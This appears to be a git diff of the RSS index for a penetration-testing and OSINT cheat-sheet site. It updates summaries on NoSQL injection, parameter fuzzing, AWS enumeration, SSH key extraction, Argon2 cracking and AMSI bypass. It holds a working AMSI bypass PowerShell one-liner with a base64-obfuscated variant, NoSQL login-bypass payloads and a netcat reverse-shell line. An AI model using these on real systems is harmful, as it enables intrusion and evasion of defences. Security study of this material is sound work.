@@ -59,8 +59,7 @@ Modules / Addons # Autorize # For Each Request you do, it will send an equal req
       <guid>/web-pentest/resources-discovery/content_discovery/</guid>
       <description>Resources # Fuzzing Wordlists https://github.com/fuzzdb-project/fuzzdb # Fuzzing and Content Discovery https://github.com/kaimi-io/web-fuzz-wordlists 
 Tips # Fuzz non-printable characters in any user input # Could result in regex bypass, account takeover... 0x00, 0x2F, 0x3A, 0x40, 0x5B, 0x60, 0x7B, 0xFF %00, %2F, %3A, %40, %5B, %60, %7B, %FF 
-JS extraction # Extract endpoint from JS files (https://github.com/jobertabma/relative-url-extractor) ruby extract.rb https://hackerone.com/some-file.js 
-Broken Links # Check for broken links and domain takeover # For twitter, TwitterBFTD is great https://github.</description>
+Scrapping from JS # You can parse and scrape javascript content in a target website to look for hidden subdomains or interesting paths # Often, endpoints are not public but users can still interact with them # Tools like dirscraper automates this (https://github.</description>
     </item>
     
     <item>
@@ -144,7 +143,7 @@ Wrapcat - Automating hashcat commands https://twitter.com/Haax9_/status/13403546
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/ip_address/</guid>
-      <description>Getting Informations Whois and ASN # Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com https://whoisology.com # myip.ms can provie additional informations https://myip.ms/# Get ASN for your target bgp.he.net # Pear is a tool used to get informations about an AS https://github.com/routeur/Pear python3 Pear.py -a [ASNumber]# You can identify IP block owned by a company ipv4info.com Online Scanners # Shodan.io and Censys.io are also usefull # Keywords on Shodan https://beta.</description>
+      <description>Getting Informations Whois and ASN # Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com https://whoisology.com # myip.ms can provie additional informations https://myip.ms/# Get ASN for your target bgp.he.net # Pear is a tool used to get informations about an AS https://github.com/routeur/Pear python3 Pear.py -a [ASNumber]# You can identify IP block owned by a company ipv4info.com# IP Reputation https://reputation.team-cymru.com/ Online Scanners # Shodan.io and Censys.io are also usefull # Keywords on Shodan https://beta.</description>
     </item>
     
     <item>
@@ -238,7 +237,7 @@ Local Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/phishing-redteam-and-se/phishing_campaign_setup/</guid>
-      <description>General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup # Generate typo &amp;amp; permutations on a domain name https://dnstwister.report/ 
+      <description>General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup # Generate typo &amp;amp; permutations on a domain name https://dnstwister.report/# Message Header Analyzer https://mha.azurewebsites.net/ 
 Debugging Tips / Important notes Blacklisted/Spam domain # If the domain is blacklisted / considered as spam, you can try to reference www.</description>
     </item>
     
@@ -549,7 +548,8 @@ Getting account linked to an e-mail # Great trick https://www.intelligencewithst
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-pentest/injections/server-side-injections/nosql/</guid>
-      <description>Basic Authentication index.php?login[$regex]=a.*&amp;amp;pass[$ne]=lol index.php?login[$gt]=admin&amp;amp;login[$lt]=test&amp;amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin&amp;amp;login[$nin][]=test&amp;amp;pass[$ne]=toto 
+      <description>NoSQLMap https://github.com/codingo/NoSQLMap 1-Set options (do this first) 2-NoSQL DB Access Attacks 3-NoSQL Web App attacks 4-Scan for Anonymous MongoDB Access x-Exit 
+Basic Authentication index.php?login[$regex]=a.*&amp;amp;pass[$ne]=lol index.php?login[$gt]=admin&amp;amp;login[$lt]=test&amp;amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin&amp;amp;login[$nin][]=test&amp;amp;pass[$ne]=toto 
 Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$regex]=.1 # Enumeration index.php ?</description>
     </item>
     
@@ -561,7 +561,7 @@ Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$
       <guid>/open-source-intelligence-osint/tools-and-methodology/opsec/</guid>
       <description>[WIP]
 Resources https://github.com/devbret/online-opsec/ https://anonymousplanet.github.io/thgtoa/guide.html 
-Technical OPSEC # Simple data analysis (headers, OS...) https://amiunique.org/fp # Creating profile pictures for sock # Mixing two pictures https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ # Email providers comparison https://www.privacytools.io/providers/email/ # Compilation of great ressources https://shutuptrackers.com/index.php # Windows 10 Tracking https://github.com/10se1ucgo/DisableWinTracking # Firefox Configuration Posts https://daring-india-marten-972.medium.com/osint-comment-naviguer-en-eaux-troubles-32f11ab985ac 
+Technical OPSEC # Simple data analysis (headers, OS...) https://amiunique.org/fp # Creating profile pictures for sock # Mixing two pictures https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ # Email providers comparison https://www.privacytools.io/providers/email/ # Compilation of great ressources https://shutuptrackers.com/index.php # Windows 10 Tracking https://github.com/10se1ucgo/DisableWinTracking # Firefox Configuration Posts https://daring-india-marten-972.medium.com/osint-comment-naviguer-en-eaux-troubles-32f11ab985ac# A directory of direct links for you to obtain your data from web services. https://justgetmydata.com/ 
 Human Related OPSEC # Image Cloaking for Personal Privacy # Fawkes takes your personal images and makes tiny, pixel-level changes that are invisible to the human eye # if and when someone tries to use these photos to build a facial recognition model # &amp;#34;cloaked&amp;#34; images will teach the model an highly distorted version of what makes you look like you http://sandlab.</description>
     </item>
     
@@ -589,7 +589,7 @@ Human Related OPSEC # Image Cloaking for Personal Privacy # Fawkes takes your pe
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-pentest/resources-discovery/parameters/</guid>
-      <description>Hidden parameters # Sometimes hidden parameters are set on pages # You can use tools like Arjun to find them (https://github.com/s0md3v/Arjun) python3 arjun.py -u https://api.example.com/endpoint --get # Multi threading python3 arjun.py -u https://api.example.com/endpoint --get -t 22 # Delay between requests python3 arjun.py -u https://api.example.com/endpoint --get -d # You can also use patator # GET patator http_fuzz url=&amp;#39;url/FILE0=1&amp;#39; 0=parameters.txt -x ignore:fgrep=&amp;#39;error reflected content&amp;#39; # POST patator http_fuzz url=&amp;#39;url/&amp;#39; method=POST body=&amp;#39;FILE0=1&amp;#39; 0=wordlist.</description>
+      <description>Hidden parameters Comparison https://4rt.one/blog/1.html x8 https://github.com/sh1yo/x8 # Send parameters via query x8 -u &amp;#34;https://example.com/&amp;#34; -w &amp;lt;wordlist&amp;gt; # With some default parameters: x8 -u &amp;#34;https://example.com/?something=1&amp;#34; -w &amp;lt;wordlist&amp;gt; # Send parameters via body x8 -u &amp;#34;https://example.com/&amp;#34; -X POST --as-body -w &amp;lt;wordlist&amp;gt; Arjun # Sometimes hidden parameters are set on pages # You can use tools like Arjun to find them (https://github.com/s0md3v/Arjun) python3 arjun.py -u https://api.example.com/endpoint --get # Multi threading python3 arjun.py -u https://api.</description>
     </item>
     
     <item>
@@ -762,7 +762,7 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/network-and-domain-recon/domain_mapping/</guid>
-      <description>BloodHound Tips # Right Click # Get information about the node and also how to compromise the user / machine # Owned # Can be usefull during an internal pentest to note where you are # Nodes will be tagged with a skull # It&amp;#39;s then possible to ask the shortest path to a node from the owned ones # Filters # Can be usefull # Shortcuts # CTRL --&amp;gt; Change node display # CTRL+SHIFT+I --&amp;gt; Developper Tools # CTRL+R --&amp;gt; Reload display # Still possible to edit data to set what you want# If you don&amp;#39;t have access to a domain machine but have creds # You can run from host runas /netonly /user:FQDN.</description>
+      <description>BloodHound # /!\ Information here might be outdated # Future update incoming Tips # Right Click # Get information about the node and also how to compromise the user / machine # Owned # Can be usefull during an internal pentest to note where you are # Nodes will be tagged with a skull # It&amp;#39;s then possible to ask the shortest path to a node from the owned ones # Filters # Can be usefull # Shortcuts # CTRL --&amp;gt; Change node display # CTRL+SHIFT+I --&amp;gt; Developper Tools # CTRL+R --&amp;gt; Reload display # Still possible to edit data to set what you want# If you don&amp;#39;t have access to a domain machine but have creds # You can run from host runas /netonly /user:FQDN.</description>
     </item>
     
     <item>
@@ -938,9 +938,7 @@ Online DNS tools and services # VirusTotal runs its own passive DNS replication 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/resources/systems/</guid>
-      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  Privilege Escalation  PrivExchange (https://github.com/dirkjanm/PrivExchange) Abusing Exchange (https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) Exploiting PrivExchange (https://chryzsh.github.io/exploiting-privexchange/)
- LOLBAS (https://lolbas-project.github.io/#)
- Windows EoP Cheatsheet (https://guif.</description>
+      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) Hunting for Skeleton Key implants (https://riccardoancarani.github.io/2020-08-08-hunting-for-skeleton-keys/) Hunting for Impacket (https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) Kerberoasting without SPNs (https://swarm.ptsecurity.com/kerberoasting-without-spns/)  Privilege Escalation  PrivExchange (https://github.</description>
     </item>
     
     <item>
@@ -1098,6 +1096,16 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
     </item>
     
     <item>
+      <title>SSL Keys extraction</title>
+      <link>/cryptography/ssl_keys_extraction/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/cryptography/ssl_keys_extraction/</guid>
+      <description>Resources https://github.com/aviat/passe-partout 
+Extraction SSH Agent $ sudo ./passe-partout 4712 Target has pid 4712 on_signal(17 - SIGCHLD) from 4712 [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [X] Valid RSA key found. [X] Key saved to file id_rsa-0.key [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. done for pid 4712 OpenSSH_4.3p2 Debian-6, OpenSSL 0.</description>
+    </item>
+    
+    <item>
       <title>Searching Informations</title>
       <link>/windows-systems/post-exploitation-techniques/searching_informations/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1134,7 +1142,7 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/username/</guid>
-      <description># Username availability https://namechk.com/ 
+      <description># Username availability https://namechk.com/ # Another service (290 tests) https://whatsmyname.app/ 
 Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
     </item>
     
@@ -1187,6 +1195,16 @@ Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # A
     </item>
     
     <item>
+      <title>nuclei</title>
+      <link>/web-pentest/tools/nuclei/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/tools/nuclei/</guid>
+      <description>Resources https://nuclei.projectdiscovery.io/ https://github.com/projectdiscovery/nuclei-templates 
+Usage and Examples Targets and settings # Templates nuclei -t exposures/configs/git-config.yaml -l urls.txt nuclei -t cves/2021/ -l urls.txt nuclei -t cves/2020/ -t exposed-tokens -t misconfiguration -l urls.txt # Tags nuclei -tags cve -u urls.txt nuclei -tags config -t exposures/ -u urls.txt nuclei -tags lfi,ssrf,rce -t cves/ -l urls.txt # Workflows nuclei -w workflows/wordpress-workflow.yaml -l wordpress_urls.txt nuclei -w workflows/wordpress-workflow.yaml -w workflows/jira-workflow.yaml -l urls.txt # Severity nuclei -t cves/ -severity critical -l urls.</description>
+    </item>
+    
+    <item>
       <title>80/443 - HTTP/HTTPS</title>
       <link>/network/services-enumeration/80_443_https/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1203,6 +1221,16 @@ Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # A
       <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
       <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
 Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+    </item>
+    
+    <item>
+      <title>Amazon Web Services (AWS)</title>
+      <link>/other-systems/amazon_web_services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/other-systems/amazon_web_services/</guid>
+      <description>https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://github.com/RhinoSecurityLabs/ccat https://github.com/RhinoSecurityLabs/pacu https://github.com/carnal0wnage/weirdAAL https://github.com/Static-Flow/CloudCopy # Cheatsheet https://www.magnussen.funcmylife.fr/article_35 GitLeaks (https://github.com/zricethezav/gitleaks) # Audit git repos for secrets keys ./gitleaks --repo=xxxxx --verbose --pretty 
+Enumerate IAM (https://github.com/andresriancho/enumerate-iam) # Enumerate the permissions associated with AWS credential set ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... # enumerate-iam.py tries to brute force all API calls allowed by the IAM policy. # The calls performed by this tool are all non-destructive (only get* and list* calls are performed).</description>
     </item>
     
     <item>
@@ -1244,7 +1272,8 @@ Exploiting crontab # If a script is running with higher privileges echo &amp;#34
       
       <guid>/resources/cti/</guid>
       <description> Some CTI Resources  Threat Actor Map (https://aptmap.netlify.app/#) Darknet Markets For Investigators (https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/)  
-Not really CTI Related but can help  Le Dessous des Cartes (Geopolitics) (https://www.youtube.com/c/LeDessousdesCartesARTE/videos)  </description>
+Not really CTI Related but can help  Le Dessous des Cartes (Geopolitics) (https://www.youtube.com/c/LeDessousdesCartesARTE/videos)  
+Training and learning  A Cyber Threat Intelligence Self-Study Plan: Part 1 (https://medium.com/katies-five-cents/a-cyber-threat-intelligence-self-study-plan-part-1-968b5a8daf9a)   Tools and Usable informations  Certstream project (https://certstream.calidog.io/)  </description>
     </item>
     
     <item>
@@ -1282,6 +1311,15 @@ Not really CTI Related but can help  Le Dessous des Cartes (Geopolitics) (https:
       <guid>/windows-systems/exploitation/kerberos/</guid>
       <description>Cheatsheet : https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a KRB5CONF : https://gist.github.com/kaluche/ba69e701624c2e44e3d1f60c5370cebe
 General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
+    </item>
+    
+    <item>
+      <title>MISC &amp; Others</title>
+      <link>/passcracking-hashfiles/misc_others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/passcracking-hashfiles/misc_others/</guid>
+      <description> Argon2 cracker https://github.com/CyberKnight00/Argon2_Cracker # Argon2 is a key derivation function that was selected as the winner of the Password Hashing # Competition in July 2015. It is designed by Alex Biryukov, Daniel Dinu, and Dmitry Khovratovich # from University of Luxembourg. Argon2 has 3 variants : Argon2d, Argon2i and Argon2id. ./crack_argon2.py -c &amp;#39;&amp;lt; Argon2 Hash &amp;gt;&amp;#39; -w &amp;#39;&amp;lt; Path/To/Wordlist &amp;gt;&amp;#39;</description>
     </item>
     
     <item>
@@ -1360,6 +1398,15 @@ Usage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--addr
       
       <guid>/web-pentest/injections/headers_injections/</guid>
       <description>Security Headers HTTP Strict Transport Security (HSTS) --- Force HTTPS if enabled on the website Content Security Policy (CSP) --- Restrict/Whitelist some resources for some users X-XSS-Protection --- Protection for XSS X-Frame-Options --- Protect from clickjacking by removing iframes X-Content-Type-Options --- Protect from MIME sniffing # Cookie Set-Cookie Secure --- Prevent cookie stealing during transport Set-Cookie HttpOnly --- Prevent cookie stealing in the web browser Set-Cookie SameSite --- Prevent from CSRF (cookies will stay on the website)</description>
+    </item>
+    
+    <item>
+      <title>Kubernetes</title>
+      <link>/other-systems/kubernetes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/other-systems/kubernetes/</guid>
+      <description>Resources https://book.hacktricks.xyz/pentesting/pentesting-kubernetes</description>
     </item>
     
     <item>
@@ -1453,8 +1500,7 @@ SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserve
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/geolocation/</guid>
-      <description>Maps MISC # Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ # 360° pictures database https://www.360cities.net/ # Compare maps by time # Many historical maps http://www.georeferencer.com # Word Postal Codes https://worldpostalcode.com/ Google Maps Alternatives https://twitter.com/y_vdw/status/1339984896022876160 # Other maps services https://yandex.com/maps http://openstreetcam.org/map/ https://www.mapillary.com/ # Search for specific country https://twitter.com/y_vdw/status/1339984940377624576?s=20 https://en.wikipedia.org/wiki/List_of_street_view_services 
-Realtime Movement (MISC) Instant StreetView https://www.instantstreetview.com/ # Car embedded cameras tracks https://openstreetcam.</description>
+      <description>Maps MISC # Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ # 360° pictures database https://www.360cities.net/ # Compare maps by time # Many historical maps http://www.georeferencer.com # Word Postal Codes https://worldpostalcode.com/ Google Maps Alternatives https://twitter.com/y_vdw/status/1339984896022876160 # Other maps services https://yandex.com/maps http://openstreetcam.org/map/ https://www.mapillary.com/ # Search for specific country https://twitter.com/y_vdw/status/1339984940377624576?s=20 https://en.wikipedia.org/wiki/List_of_street_view_services # ZoomEarth provides really great images and features such as estimation and live pictures https://zoom.</description>
     </item>
     
     <item>
@@ -1522,6 +1568,7 @@ Exploiting the classic Manager # Metasploit provides an easy to use module to up
       
       <guid>/open-source-intelligence-osint/human-recon/misc/</guid>
       <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig 
+Newspaper # Elephind is a search engine for newspaper archives https://www.elephind.com/ 
 Skype # Online source tool used to find and get information about Skype accounts https://www.</description>
     </item>
     
@@ -1620,16 +1667,6 @@ Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxx
     </item>
     
     <item>
-      <title>Amazon Web Services (AWS)</title>
-      <link>/other-systems/amazon_web_services/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/other-systems/amazon_web_services/</guid>
-      <description>https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://github.com/RhinoSecurityLabs/ccat https://github.com/RhinoSecurityLabs/pacu https://github.com/carnal0wnage/weirdAAL https://github.com/Static-Flow/CloudCopy # Cheatsheet https://www.magnussen.funcmylife.fr/article_35 GitLeaks (https://github.com/zricethezav/gitleaks) # Audit git repos for secrets keys ./gitleaks --repo=xxxxx --verbose --pretty 
-Enumerate IAM (https://github.com/andresriancho/enumerate-iam) # Enumerate the permissions associated with AWS credential set ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... # enumerate-iam.py tries to brute force all API calls allowed by the IAM policy. # The calls performed by this tool are all non-destructive (only get* and list* calls are performed).</description>
-    </item>
-    
-    <item>
       <title>Azure AD</title>
       <link>/windows-systems/privilege-escalation/azure_ad/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1681,13 +1718,24 @@ Snmpwalk snmpwalk -c public -v1 IP 1 &amp;gt; snmpwalk.txt Windows RUNNING PROCE
     </item>
     
     <item>
+      <title>AMSI Bypass and Evasion</title>
+      <link>/windows-systems/privilege-escalation/amsi_and_evasion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/amsi_and_evasion/</guid>
+      <description>Resources # AMSI Bypass Methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/ https://www.contextis.com/us/blog/amsi-bypass https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ # DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # AMSI Bypass generator https://amsi.fail/ 
+AMSI Bypass Methods # Methods pulled from the previous mentionned resources # More details on the resources # 1. Powershell Downgrade # Older version of powershell doesn&amp;#39;t use AMIS powershell -version 2# 2. Base64 Encoding # Original AMSI Bypass PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.AmsiUtils&amp;#39;).GetField(&amp;#39;amsiInitFailed&amp;#39;,&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # Base64 encoded PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.&amp;#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;QQBtAHMAaQBVAHQAaQBsAHMA&amp;#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&amp;#39;))),&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true)# 3. Hooking # The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed .</description>
+    </item>
+    
+    <item>
       <title>MISC</title>
       <link>/web-pentest/misc_tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-pentest/misc_tricks/</guid>
       <description># Security Headers https://securityheaders.com # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox extension for security https://addons.mozilla.org/fr/firefox/addon/hacktools/ 
-HTTP Methods # With this script, you can test various HTTP methods against an URL. # Cool and usefull tool by Shutdown for the recon phase https://github.com/ShutdownRepo/httpmethods HTTP Methods Tester, v1.0.2 usage: httpmethods.py [-h] -u URL [-v] [-q] [-k] [-w WORDLIST] [-t THREADS] [-j JSONFILE] This Python script can be used for HTTP verb tampering to bypass forbidden access, and for HTTP methods enumeration to find dangerous enabled methods like PUT optional arguments: -h, --help show this help message and exit -u URL, --url URL e.</description>
+Qsreplace https://github.com/tomnomnom/qsreplace # Accept URLs on stdin, replace all query string values with a user-supplied value # only output each combination of query string parameters once per host and path. cat urls.txt | qsreplace newval https://example.com/path?one=newval&amp;amp;two=newval https://example.com/pathtwo?one=newval&amp;amp;two=newval https://example.net/a/path?one=newval&amp;amp;two=newval 
+JSON Web Tokens (JWT) https://jwt.</description>
     </item>
     
     <item>
